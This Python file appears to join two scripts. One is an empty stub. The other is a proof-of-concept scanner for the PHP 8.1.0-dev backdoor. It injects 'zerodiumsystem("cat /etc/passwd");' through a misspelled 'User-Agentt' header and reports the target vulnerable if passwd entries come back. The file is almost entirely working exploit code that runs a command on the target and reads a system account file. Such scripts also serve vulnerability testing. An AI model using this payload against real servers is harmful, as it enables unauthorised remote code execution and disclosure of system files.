#!/usr/bin/env python
# -*- coding:utf-8 -*-
# @FileName  :8.1php.py
# @Time      :2023/4/3 19:45
# @Author    :Raink


if __name__ == "__main__":
    run_code = 0
#!/usr/bin/env python
# -*- coding:utf-8 -*-
# @FileName  :php 8.1-backdoor.py
# @Time      :2023/4/3 10:59
# @Author    :Raink
import re
import requests
# http://your-ip:8080
def connect(ip):
  url=f"{ip}"
  try:
    response = requests.get(url)
    headers=response.request.headers
    headers["User-Agentt"]='zerodiumsystem("cat /etc/passwd");'
    res = requests.get(url, headers=headers)
    result=res.content.decode('utf-8')
    # print(result)
    code=res.status_code
    if code==200 and re.match("\S+:\S+:\S+:\S+:\S+:\S+",result):
         print("存在PHP8.1-backdoor 执行任意代码漏洞'")
  except:
      pass





